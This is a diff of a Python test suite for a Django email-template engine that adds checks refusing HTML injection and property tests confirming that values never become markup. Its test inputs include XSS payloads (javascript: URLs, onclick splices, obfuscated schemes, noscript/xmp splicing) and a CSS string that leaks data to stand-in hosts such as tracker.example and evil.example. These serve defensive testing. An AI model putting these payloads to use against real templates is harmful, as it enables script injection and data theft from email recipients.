@@ -9,6 +9,7 @@ import re
 import threading
 import time
 import zoneinfo
+from collections.abc import Iterable
 from decimal import Decimal
 from html.parser import HTMLParser
 from pathlib import Path
@@ -24,7 +25,7 @@ from django.template.base import DebugLexer, Node, Parser, tag_re
 from django.template.defaulttags import TemplateLiteral
 from django.utils import timezone
 from django.utils.safestring import SafeString, mark_safe
-from hypothesis import HealthCheck, given, settings
+from hypothesis import HealthCheck, example, given, settings
 from hypothesis import strategies as st
 from rebac import system_context
 
@@ -44,6 +45,8 @@ from angee.messaging_templates.engine import (
 )
 from angee.messaging_templates.testing.models import MessageTemplate
 from angee.messaging_templates.walker import (
+    LINK_ATTRIBUTES,
+    OUTPUT_ATTRIBUTES,
     WALKED_NODES,
     RowPiece,
     TemplateWalk,
@@ -434,6 +437,26 @@ HTML_ENGINE = MessageTemplateEngine(autoescape=True)
         pytest.param('<p onclick="x">x</p>', True, id="on-attribute"),
         *(pytest.param(f'<img {name}="x">', True, id=f"attribute-{name}")
           for name in ("srcset", "background", "poster", "action", "formaction", "xlink:href", "cite")),
+        *(pytest.param(f"<p>a</p><{tag}>b</{tag}>", True, id=f"s3-{tag}")
+          for tag in ("noscript", "xmp", "noembed", "noframes", "plaintext", "textarea")),
+        pytest.param('<noscript><p title="</noscript><b title={{ a }}>"></p></noscript>', True,
+                     id="s3-noscript-splice"),
+        pytest.param('<xmp><p title="</xmp><b title={{ a }}>"></p></xmp>', True, id="s3-xmp-splice"),
+        pytest.param('<span title="a" title={{ a }}>x</span>', True, id="s1-repeated-name-unquoted"),
+        pytest.param('<span title="a" title="{{ a }}">x</span>', True, id="s1-repeated-name"),
+        pytest.param('<span TITLE="a" title={{ a }}>x</span>', True, id="s1-repeated-name-in-capitals"),
+        pytest.param('<a href="https://example.test/" href={{ a|url }}>x</a>', True, id="s1-repeated-href"),
+        pytest.param('<p TITLE="{{ a }}">x</p>', True, id="s1-capital-name"),
+        pytest.param('<p title = "{{ a }}">x</p>', True, id="s1-spaced-equals"),
+        pytest.param('<p title="{{ a }}" >x</p>', True, id="s1-space-before-close"),
+        pytest.param('<a\nhref="https://example.test/"\ntitle="{{ a }}">x</a>', True, id="s1-newlines"),
+        pytest.param('<p title="a&b {{ a }}">x</p>', True, id="s1-bare-ampersand"),
+        pytest.param('<p title="a &amp; b {{ a }}">x</p>', False, id="s1-admitted-escaped"),
+        pytest.param('<img alt="{{ a }}" src="https://example.test/a.png" />', False, id="s1-admitted-self-closing"),
+        pytest.param('<td nowrap title="{{ a }}">x</td>', False, id="s1-admitted-bare-attribute"),
+        pytest.param("<title>{% include 'parts/p' only %}</title>", True, id="title-element-include"),
+        pytest.param("<title>{% for a in b %}{{ a }}{% endfor %}</title>", True, id="title-element-for"),
+        pytest.param("<title>{{ subject }}{% if a %} {{ a }}{% endif %}</title>", False, id="admitted-title-element"),
         pytest.param("<{{ tag }}>x</{{ tag }}>", True, id="span-starts-a-tag"),
         pytest.param("<a{{ tag }}>x</a>", True, id="span-in-a-tag-name"),
         pytest.param('<p {{ name }}="x">x</p>', True, id="span-in-an-attribute-name"),
@@ -470,6 +493,56 @@ HTML_ENGINE = MessageTemplateEngine(autoescape=True)
 def test_the_html_checks(html: str, refused: bool) -> None:
     assert bool(check_html(html, compiled_expression(HTML_ENGINE))) is refused, check_html(
         html, compiled_expression(HTML_ENGINE))
+
+
+@pytest.mark.parametrize(
+    ("ending", "refused"),
+    [
+        ("<a", True), ('<a href="https://example.test/"', True), ('<a title="x', True), ("<a href=", True),
+        ("<style>", True), ("<style>.a{", True), ("<title>", True), ("<!--", True), ("<!", True), ("</", True),
+        ("&am", True), ("<b><i>", False), ("", False),
+    ],
+)
+def test_a_form_ends_where_it_started(ending: str, refused: bool) -> None:
+    """S2 (i3): html.parser drops an unfinished tag at the end and never closes <style>; a form ends in text."""
+
+    refusals = check_html("<p>x</p>" + ending, compiled_expression(HTML_ENGINE))
+    assert any("it ends inside" in refusal for refusal in refusals) is refused, refusals
+
+
+def test_a_row_cannot_leave_the_next_row_inside_a_tag_or_a_style(plain: Any, kit: Any) -> None:
+    """S2 (a1, a2): a block ending inside a tag or a <style> is refused, so no template's value lands there."""
+
+    del plain
+    continuations = {
+        "open_a": ("<p>Hi</p><a", ' href="{{ link }}" style="background:url({{ link }})">Open</a>'),
+        "open_attribute": ('<p>Hi</p><a title="x"', ' href="{{ link }}">Open</a>'),
+        "open_quote": ('<p>Hi</p><a title="x', '" href="{{ link }}">Open</a>'),
+        "open_style": ("<p>Hi</p><style>", "Hello {{ link }}, welcome."),
+    }
+    for key, (ending, continuation) in continuations.items():
+        assert any("it ends inside" in refusal for refusal in _refusals(_unsaved(
+            "block", key, source=ending, text_source="x"))), key
+        _row("block", key, source=ending, text_source="x")  # past clean, as a write that skipped the walk
+        template = _mail(f'{{% include "blocks/{key}" only %}}{continuation}', {"link": "x"}, format="html",
+                         text_source="{{ link }}", key=f"tests.{key}")
+        with pytest.raises(ValidationError, match="it ends inside"):
+            _render(template, {"link": "javascript:alert(document.domain)"}, kit)
+
+
+def test_a_static_value_never_links_to_a_refused_scheme() -> None:
+    """Fix 4 (q12): a static value reaching a scheme url refuses is refused in every attribute, as decoded."""
+
+    expression = compiled_expression(HTML_ENGINE)
+    for name in ("ping", "longdesc", "usemap", "lowsrc", "dynsrc", "data", "codebase", "manifest", "profile",
+                 "archive", "itemtype", "xmlns", "title", "class"):
+        for value in ("javascript:alert(1)", "JaVaScRiPt:x", " vbscript:x", "java&#9;script:x", "&#1;file:///x",
+                      "data:text/html,x"):
+            assert check_html(f'<img {name}="{value}">', expression), (name, value)
+    assert check_html('<p title="{% if a %}javascript{% endif %}:x">x</p>', expression)
+    for admitted in ('<html xmlns:v="urn:schemas-microsoft-com:vml">', '<img alt="Note: ready">',
+                     '<p style="color:red;background:#fff">x</p>', '<meta content="width=device-width">'):
+        assert check_html(admitted, expression) == [], admitted
 
 
 def test_static_url_as_decoded() -> None:
@@ -593,21 +666,150 @@ def test_values_never_become_markdown(plain: Any, kit: Any) -> None:
 # ---------- values ----------
 
 
-class _Markup(HTMLParser):
-    def __init__(self) -> None:
-        super().__init__(convert_charrefs=True)
-        self.shape: list[tuple[str, tuple[str, ...]]] = []
+class _Reading(HTMLParser):
+    """What a mail client reads of a rendered body: elements, attributes, comments and CSS; text set aside.
+
+    Read twice, with scripting off and on, since a ``<noscript>`` element's content is markup to one reader and
+    text to the other.
+    """
+
+    def __init__(self, *, scripting: bool) -> None:
+        super().__init__(convert_charrefs=True, scripting=scripting)
+        self.markup: list[tuple[Any, ...]] = []
+        self.css: list[str] = []
 
     def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
         if tag != "br":  # linebreaksbr writes <br> after escaping, as it may
-            self.shape.append((tag, tuple(name for name, _ in attrs)))
+            self.markup.append(("start", tag, tuple(attrs)))
+
+    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        self.handle_starttag(tag, attrs)
+
+    def handle_endtag(self, tag: str) -> None:
+        if tag != "br":
+            self.markup.append(("end", tag))
+
+    def handle_data(self, data: str) -> None:
+        if self.cdata_elem == "style":
+            self.css.append(data)
+
+    def handle_comment(self, data: str) -> None:
+        self.markup.append(("comment", data))
+
+    def handle_decl(self, decl: str) -> None:
+        self.markup.append(("decl", decl))
+
+    def unknown_decl(self, data: str) -> None:
+        self.markup.append(("decl", data))
+
+    def handle_pi(self, data: str) -> None:
+        self.markup.append(("pi", data))
 
 
-def _shape(html: str) -> list[tuple[str, tuple[str, ...]]]:
-    parser = _Markup()
-    parser.feed(html)
-    parser.close()
-    return parser.shape
+MARKER = "MARKER"
+
+
+def _assert_value_stays_text(marker_html: str, hostile_html: str, value: str) -> None:
+    """Property 1: ``value`` adds no element, attribute, comment or CSS, and reaches a link only through ``url``.
+
+    ``marker_html`` is the same rows rendered with :data:`MARKER` for the value. Every element and attribute is
+    the same in both, so is every ``<style>`` text, and an attribute value differs only where the HTML checks
+    admit an output (``title``, ``alt``…) or in ``href`` and ``src`` as ``url`` makes a link of the value.
+    """
+
+    for scripting in (False, True):
+        marker, hostile = _Reading(scripting=scripting), _Reading(scripting=scripting)
+        for reading, html in ((marker, marker_html), (hostile, hostile_html)):
+            reading.feed(html)
+            reading.close()
+        assert hostile.css == marker.css, (hostile.css, marker.css)
+        assert [event[:2] for event in hostile.markup] == [event[:2] for event in marker.markup], hostile_html
+        for before, after in zip(marker.markup, hostile.markup, strict=True):
+            if before[0] != "start":
+                assert after == before
+                continue
+            assert [name for name, _ in after[2]] == [name for name, _ in before[2]], (before, after)
+            for (name, was), (_, now) in zip(before[2], after[2], strict=True):
+                if name in OUTPUT_ATTRIBUTES or (name in LINK_ATTRIBUTES and (was, now) == (url(MARKER), url(value))):
+                    continue
+                assert now == was, (before[1], name, was, now)
+
+
+class _Rows:
+    """A reader over unsaved rows, so a property walks rows without writing them."""
+
+    def __init__(self, *rows: Any) -> None:
+        self.rows = {row.handler.template_name(row.key): row for row in rows}
+
+    def named_rows(self, names: Iterable[str], *, language: str) -> dict[str, Any]:
+        del language
+        return {name: self.rows[name] for name in names if name in self.rows}
+
+    def resolves_name(self, name: str) -> bool:
+        return name in self.rows
+
+
+SPLICE = "y style=color:red onclick=alert(1)"
+JAVASCRIPT = "javascript:alert(document.domain)"
+CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"
+
+_ATTRIBUTE = st.builds(
+    lambda name, quoting, value: " " + name + quoting.format(value),
+    st.sampled_from(["title", "TITLE", "alt", "href", "style", "class"]),
+    st.sampled_from(['="{}"', "='{}'", "={}", ' = "{}"']),
+    st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{{ v|upper }}", "{% if v %}{{ v }}{% endif %}",
+                     "color:{{ brand.light.text }}"]),
+)
+_START_TAG = st.builds(
+    lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
+    st.sampled_from(["p", "span", "a", "td", "style", "title", "noscript", "xmp", "textarea"]),
+    st.lists(_ATTRIBUTE, max_size=3),
+    st.sampled_from([">", " >", " />", ""]),
+)
+_HTML = st.lists(
+    st.one_of(_START_TAG, st.sampled_from([
+        "</p>", "</span>", "</a>", "</style>", "</title>", "</noscript>", "text", "{{ v }}", "{{ v|linebreaksbr }}",
+        '"', "'", ">", "<", "&", "\n",
+    ])),
+    max_size=8,
+).map("".join)
+
+
+@settings(
+    deadline=None, max_examples=150,
+    suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow],
+)
+@given(
+    before=_HTML, block=_HTML, after=_HTML,
+    value=st.one_of(st.sampled_from([SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>']), st.text(max_size=40)),
+)
+# The reviewers' rows: a repeated attribute name (S1), and a row that ends inside a tag or a <style> (S2).
+@example(before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="", after="", value=SPLICE)
+@example(before="", block="<p>Hi</p><a", after=' href="{{ v }}" style="background:url({{ v }})">Open</a>',
+         value=JAVASCRIPT)
+@example(before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>', value=JAVASCRIPT)
+@example(before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS)
+def test_a_value_never_becomes_markup(kit: Any, before: str, block: str, after: str, value: str) -> None:
+    """Property 1, over the rows the walk admits: a value never becomes markup, an attribute, a link target or CSS.
+
+    The rows are drawn from tags in every quoting and spelling of their attributes, raw-text elements, and a
+    block that may end anywhere, included between two runs of the template's own HTML.
+    """
+
+    template = _unsaved(
+        format="html", source=before + '{% include "blocks/probe" with v=v only %}' + after, text_source="{{ v }}",
+        variables={"v": "x"},
+    )
+    rows = _Rows(template, _unsaved("layout", "plain"),
+                 _unsaved("block", "probe", source=block, text_source="x", variables={"v": "x"}))
+    try:
+        walk = TemplateWalker(saving=True).walk(template, rows)
+    except ValidationError:
+        return  # a refused row never renders
+    marker = walk.render({"v": MARKER}, kit=kit).html
+    _assert_value_stays_text(marker, walk.render({"v": value}, kit=kit).html, value)
 
 
 PROPERTY_SOURCE = (
@@ -615,14 +817,14 @@ PROPERTY_SOURCE = (
     "{% for i in items %}{{ i }}{% endfor %}|{{ v|default:'d' }}|{{ v|upper }}|{{ v|lower }}|{{ v|capfirst }}|"
     "{{ v|title }}|{{ v|truncatechars:20 }}|{{ v|truncatewords:3 }}|{{ v|linebreaksbr }}|{{ v|length }}|"
     "{{ when|date }}|{{ v|floatformat }}|{{ v|pluralize }}|{{ v|yesno }}</p>"
-    '<a href="{{ v|url }}" title="{{ v }}">{{ v|url }}</a>'
+    '<a href="{{ v|url }}" title="{{ v }}">{{ v|url }}</a><img alt="{{ v|upper }}" src="{{ v|default:\'\'|url }}" />'
 )
 
 
 @settings(deadline=None, max_examples=40, suppress_health_check=[HealthCheck.function_scoped_fixture])
 @given(value=st.text(max_size=60))
-def test_a_value_never_becomes_markup(plain: Any, kit: Any, value: str) -> None:
-    """Property 1: through every filter and every path a value takes, html.parser finds only the rows' own markup."""
+def test_a_value_never_becomes_markup_through_any_filter(plain: Any, kit: Any, value: str) -> None:
+    """Property 1, through every filter and every path a value takes: output, alias, argument, item, default."""
 
     del plain
     with system_context(reason="tests.messaging_templates.render.property"):
@@ -631,10 +833,10 @@ def test_a_value_never_becomes_markup(plain: Any, kit: Any, value: str) -> None:
             _mail(PROPERTY_SOURCE, {"v": "x", "items.*": "x", "when": "x"}, format="html", text_source="{{ v }}",
                   key="tests.property")
         template = MessageTemplate.objects.get(key="tests.property")
-    expected = _shape(_render(template, {"v": "x", "items": ["x"], "when": "2026-11-24"}, kit).html)
+    marker = _render(template, {"v": MARKER, "items": [MARKER], "when": "2026-11-24"}, kit).html
     for candidate in (value, SafeString(value), mark_safe("<b>" + value + "</b>")):
         rendered = _render(template, {"v": candidate, "items": [candidate], "when": "2026-11-24"}, kit)
-        assert _shape(rendered.html) == expected
+        _assert_value_stays_text(marker, rendered.html, str(candidate))
 
 
 def test_a_url_value_gives_a_link_or_nothing(plain: Any, kit: Any) -> None:
@@ -646,7 +848,8 @@ def test_a_url_value_gives_a_link_or_nothing(plain: Any, kit: Any) -> None:
                  "data:text/html,x", "data:image/png;base64,AAAA", "https://" + "a" * 2_050):
         assert 'href=""' in _render(template, {"link": link}, kit).html, link
     rendered = _render(template, {"link": 'https://example.test/" onclick="x'}, kit)
-    assert _shape(rendered.html)[-1] == ("a", ("href",))
+    marker = _render(template, {"link": MARKER}, kit).html
+    _assert_value_stays_text(marker, rendered.html, 'https://example.test/" onclick="x')
     assert url("https://example.test/") == "https://example.test/"
 
 
